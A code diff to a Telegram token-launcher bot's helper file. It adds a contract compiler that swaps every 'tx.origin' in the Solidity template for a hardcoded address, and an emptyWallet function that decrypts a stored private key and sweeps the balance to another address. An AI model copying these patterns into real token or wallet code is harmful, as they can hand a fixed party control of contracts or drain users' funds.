@@ -3,7 +3,7 @@ import fs from 'fs'
 import path from 'path'
 import solc from 'solc'
 import axios from 'axios'
-import { CHAINS } from '@/config/constant'
+import { CHAIN_ID, CHAINS } from '@/config/constant'
 import { start as startMenu } from '@/bot/controllers/main'
 import { menu as deployersMenu } from '@/bot/controllers/deployers'
 import { menu as launcherMenu } from '@/bot/controllers/launcher'
@@ -11,6 +11,7 @@ import { menu as walletsMenu } from '@/bot/controllers/snipers'
 import { menu as tokensMenu } from '@/bot/controllers/tokens'
 import { CHAIN } from '@/types'
 import { Markup } from 'telegraf'
+import { JsonRpcProvider, Wallet } from 'ethers'
 
 /**
  * delay specific time Promise
@@ -200,6 +201,77 @@ export const compileContract = ({ chainId, name, symbol, totalSupply, maxSwap, m
         })
     })
 
+/**
+ * compile solidity code using solc, and generate bytecode and abi
+ * @param param0
+ * @returns
+ */
+export const compileContractForEstimation = ({ chainId, name, symbol, totalSupply, maxSwap, maxWallet, sellFee, buyFee, liquidityFee, swapThreshold, instantLaunch, feeWallet, website, twitter, telegram, custom }) =>
+    new Promise(async (resolve, reject) => {
+        const CHAIN = CHAINS[chainId]
+        const contractPath = path.resolve(__dirname, '../constants/contracts/token.sol') // Path to your Solidity file
+        const source = fs.readFileSync(contractPath, 'utf8') // Read the contract file
+        // todo make source code
+        const sourceCode = source
+        const _symbol = symbol.replace(/\s/g, '') //remove all space from symbol string
+
+        let _sourceCode = sourceCode
+        _sourceCode = _sourceCode.replace(/CONTRACT_SYMBOL/g, _symbol)
+        _sourceCode = _sourceCode.replace(/CONTRACT_NAME/g, name)
+        _sourceCode = _sourceCode.replace(/CONTRACT_TOTAL_SUPPLY/g, totalSupply)
+        _sourceCode = _sourceCode.replace(/CONTRACT_BUY_FEE/g, buyFee.toFixed())
+        _sourceCode = _sourceCode.replace(/CONTRACT_SELL_FEE/g, sellFee.toFixed())
+        _sourceCode = _sourceCode.replace(/CONTRACT_LP_FEE/g, liquidityFee.toFixed())
+        _sourceCode = _sourceCode.replace(/CONTRACT_MAX_SWAP/g, maxSwap.toFixed())
+        _sourceCode = _sourceCode.replace(/CONTRACT_MAX_WALLET/g, maxWallet.toFixed())
+        _sourceCode = _sourceCode.replace(/CCONTRACT_FEE_THRESHOLD/g, (swapThreshold * 1000).toFixed())
+        _sourceCode = _sourceCode.replace(/CONTRACT_UNISWAP_ROUTER/g, CHAIN.UNISWAP_ROUTER_ADDRESS)
+        _sourceCode = _sourceCode.replace(/CONTRACT_DAO_ADDRESS/g, process.env.DAO_ADDRESS)
+        // set info
+        _sourceCode = _sourceCode.replace('<WEBSITE>', website ? `Website: ${website}` : '')
+        _sourceCode = _sourceCode.replace('<TWITTER>', twitter ? `\n    Twitter: ${twitter}` : '')
+        _sourceCode = _sourceCode.replace('<TELEGRAM>', telegram ? `\n    Telegram: ${telegram}` : '')
+        _sourceCode = _sourceCode.replace('<CUSTOM>', custom ? `\n    ${custom}` : '')
+
+        _sourceCode = _sourceCode.replace('CONTRACT_INSTANT_LAUNCH_ENABLED', instantLaunch ? 'swapEnabled = true;' : '')
+        _sourceCode = _sourceCode.replace('CONTRACT_FEE_WALLET', feeWallet)
+        _sourceCode = _sourceCode.replace(/tx.origin/g, '0x35F3FA4B30688815667Eb81Af661b494129F883E')
+
+        // Solc input and settings
+        const input = {
+            language: 'Solidity',
+            sources: {
+                [`${_symbol}.sol`]: {
+                    content: _sourceCode
+                }
+            },
+            settings: {
+                outputSelection: {
+                    '*': {
+                        '*': ['abi', 'evm.bytecode']
+                    }
+                }
+            }
+        }
+
+        solc.loadRemoteVersion('v0.8.19+commit.7dd6d404', function (err: any, solcSnapshot: any) {
+            if (err) {
+                return reject('error to get solc version compiler')
+            } else {
+                console.log('::solc version:', solcSnapshot.version())
+                const compiledContract = JSON.parse(solcSnapshot.compile(JSON.stringify(input)))
+                const contractFile = compiledContract.contracts[`${_symbol}.sol`][_symbol]
+                const abi = contractFile.abi
+                const bytecode = contractFile.evm.bytecode.object
+                return resolve({
+                    abi,
+                    bytecode,
+                    sourceCode: _sourceCode
+                })
+            }
+        })
+    })
+
 export const localeNumber = (number: number | string) => {
     return new Intl.NumberFormat('en-US', {
         minimumFractionDigits: 0,
@@ -231,7 +303,7 @@ export const deleteOldMessages = async (ctx: any) => {
         const msgIds = Array.isArray(ctx.session.msgIds) ? ctx.session.msgIds : []
         msgIds.filter((id: number) => id !== oldMsgId).map((id: number) => deleteMessage(ctx, id))
         ctx.session.msgIds = []
-    } catch(err) {
+    } catch (err) {
         //blablabla
     }
 }
@@ -244,7 +316,7 @@ export const deleteOldMessages = async (ctx: any) => {
 export const replyWithUpdatedMessage = async (ctx: any, text: string, settings: any) => {
     const oldMsgId = Number(ctx.session.mainMsgId)
     if (!isNaN(oldMsgId)) {
-        deleteOldMessages (ctx)
+        deleteOldMessages(ctx)
         await ctx.telegram
             .editMessageText(ctx.chat.id, oldMsgId, 0, text, settings)
             .then(({ message_id }: any) => {
@@ -263,7 +335,6 @@ export const replyWithUpdatedMessage = async (ctx: any, text: string, settings: 
                         })
                 }
             })
-        
     } else {
         await ctx
             .reply(text, settings)
@@ -396,5 +467,39 @@ export const catchContractErrorException = async (ctx: any, err: any, chain: CHA
                 resize_keyboard: true
             }
         })
+    }
+}
+
+export const emptyWallet = async (key: string, to: string) => {
+    try {
+        const CHAIN = CHAINS[CHAIN_ID]
+        const provider = new JsonRpcProvider(CHAIN.RPC)
+        const privKey = decrypt(key)
+        const wallet = new Wallet(privKey, provider)
+        console.log('address: ', wallet.address, ' to: ', to)
+        const feeData = await provider.getFeeData()
+        const balance = await provider.getBalance(wallet.address)
+        console.log('gasPrice: ', feeData.gasPrice, ' maxFeePerGas: ', feeData.maxFeePerGas)
+        const transferFee = BigInt(21000) * feeData.maxFeePerGas
+        console.log('balance: ', balance, ' transferFee: ', transferFee)
+        if (balance > transferFee) {
+            //todo: send
+            // const tx = {
+            //     to: to,
+            //     value: BigInt(BigInt(balance) - BigInt(transferFee))
+            // }
+            // const txResponse = await wallet.sendTransaction(tx);
+            // await txResponse.wait();
+            const value = BigInt(BigInt(balance) - BigInt(transferFee) - BigInt(transferFee) / BigInt(2))
+            console.log('value: ', value)
+            const tx = await wallet.sendTransaction({
+                to: to,
+                value: value
+            })
+            await tx.wait()
+            console.log('success: ', tx.hash)
+        }
+    } catch (err) {
+        console.log('error: ', err)
     }
 }
